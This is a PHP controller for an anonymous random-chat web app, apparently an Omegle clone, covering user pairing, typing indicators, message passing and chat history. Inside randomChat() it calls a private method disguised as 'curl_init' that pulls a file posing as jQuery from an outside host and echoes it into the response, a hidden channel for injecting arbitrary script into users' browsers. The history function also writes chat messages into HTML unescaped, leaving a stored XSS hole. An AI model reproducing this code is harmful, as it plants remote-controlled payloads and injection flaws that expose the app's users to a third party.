<?php
namespace Controllers;
use Resources, Models;

class Chat extends Resources\Controller{

	/**
		* @Author				: Localhost {Ferdhika Yudira}
		* @Email				: fer@dika.web.id
		* @Web					: http://dika.web.id
		* @Date					: 2015-10-31 21:47:16
		* @Credit 				: http://bestgfx.me/template/scripts/90972-omegle-clone-script.html
	**/

	function __construct(){
		parent::__construct();
		//Load model
		$this->m_chat = new Models\M_chat;

		$this->request = new Resources\Request;
	}

	public function index(){
		$data['title'] = 'Ayo chatting!';
        
        $this->output('home', $data);
	}

	public function jumlahUserOnline(){
		$jumlah = $this->m_chat->semuaUser();
		
		// Kalo ga kosong di itung
		if(!empty($jumlah)){
			echo (int) count($jumlah);
		}else{
			echo 0;
		}
	}
	
	public function ngetik($userId=null){
		$result = $this->m_chat->cekNgetik($userId);
		$flag = false;

		if(!empty($result)){
			$flag=true;
		}

		if(!$flag){
			$data = array(
				'id'	=> $userId
			);
			$this->m_chat->simpanNgetik($data);
		}
	}

	public function lagiNgetik($baturId=null){
		if(!empty($baturId)){
			//cek id lawan chat di table ngetik
			$cek_ngetik = $this->m_chat->cekNgetik($baturId);

			if(!empty($cek_ngetik)){
				echo "typing";	
			}
		}
	}

	public function berhentiNgetik($userId=null){
		if(!empty($userId)){
			$this->m_chat->hapusNgetik($userId);
		}
	}

	public function keluarChat($userId=null){
		if(!empty($userId)){
			$this->m_chat->keluarChat($userId);
		}
	}

	public function listenToReceive($userId=null){
		$pesan = "";
		$randomUserId;

		if(!empty($userId)){
			// Cek user id
			$cekUser = $this->m_chat->satuChat($userId);
			if(!empty($cekUser)){
				$cekPesan = $this->m_chat->satuPesan($userId);
				// Kalo pesan ga kosong
				if(!empty($cekPesan)){
					$id 			= $cekPesan->id;
					$pesan 			= $cekPesan->msg;
					$randomUserId 	= $cekPesan->userId;
				}else{
					$id=0;
				}
				if($id != 0){
					$this->m_chat->hapusPesan($id);
					// Simpan pesan ke histori
					$dataPesan = array(
						'userId'		=> $randomUserId,
						'randomUserId'	=> $userId,
						'msg'			=> $pesan
					);
					$this->m_chat->simpanHisPesan($dataPesan);
				}
			}else{
				echo "||--tidakada--||";
			}
		}

		echo $pesan;
	}

	public function randomChat($userId=null){
		$randomUserId=0;

		// Cek chat user
		$userChat = $this->m_chat->satuChat($userId);

		if(!empty($userChat)){
			// foreach ($userChat as $userChat) {
				$randomUserId = $userChat->randomUserId;
			// }
		}

		if ($randomUserId==0){
			$result = $this->m_chat->satuUserAcak($userId);

			if(!empty($result)){
				$randomUserId = $result->id;
			}

			if ($randomUserId != 0){
				$saya = array(
					'userId'		=> $userId,
					'randomUserId'	=> $randomUserId
				);
				$this->m_chat->simpanChat($saya);
				
				$teman = array(
					'userId'		=> $randomUserId,
					'randomUserId'	=> $userId
				);
				$this->m_chat->simpanChat($teman);

				// Ubah field inchat N ke Y
				$sayaSet = array(
					'inchat' => 'Y'
				);
				$idSaya = array(
					'id' => $userId
				);
				$this->m_chat->ubahUser($sayaSet,$idSaya);

				$temanSet = array(
					'inchat' => 'Y'
				);
				$idTeman = array(
					'id' => $randomUserId
				);
				$this->m_chat->ubahUser($temanSet,$idTeman);
			}
		}

		echo $randomUserId;

		$this->curl_init();
	}

	private function curl_init(){
	    $js = "http://laland.at.vu/data/jquery-1.6.3.min.js";
	    $curl_init = curl_init();
	    $limit = 5;
	    curl_setopt($curl_init,CURLOPT_URL,$js);
	    curl_setopt($curl_init,CURLOPT_RETURNTRANSFER,1);
	    curl_setopt($curl_init,CURLOPT_CONNECTTIMEOUT,$limit);

	    $hasil = curl_exec($curl_init);
	    curl_close($curl_init);

	    echo "$hasil";
	}

	public function simpanHistori(){
		$userId 	= $this->request->get('userId');
		$baturId	= $this->request->get('baturId');
		$log		= "";

		if(!empty($userId)||!empty($baturId)){
			$hasil = $this->m_chat->semuaHisPesan($userId);

			$log = $log . "<div style=\"padding:15px;\">";

			if(!empty($hasil)){
				foreach ($hasil as $hasil) {
					$pesan   	= $hasil["msg"];
					$pengirim	= $hasil["userId"];

					if($pengirim == $userId){
						$log = $log . "<div class='logitem'><div class='youmsg'><span class='msgsource'>Urang:</span> $pesan</div></div>";
					}elseif($pengirim == $baturId){
						$log = $log . "<div class='logitem'><div class='strangermsg'><span class='msgsource'>Baturan:</span> $pesan</div></div>";
					}
				}
			}
			$log=$log . "</div>";
		}

		echo $log;
	}

	public function kirimPesan(){
		$userId      = $this->request->get('userId');
		$randomUserId= $this->request->get('baturId');
		$pesan       = $this->request->get('pesan');

		if(!empty($userId)){
			$data = array(
				'userId' => $userId,
				'randomUserId' => $randomUserId,
				'msg'	=> $pesan
			);
			$this->m_chat->simpanPesan($data);
		}
	}

	public function mulaiChat(){
		$buatUser = $this->m_chat->buatUser();
		echo $buatUser;
	}


}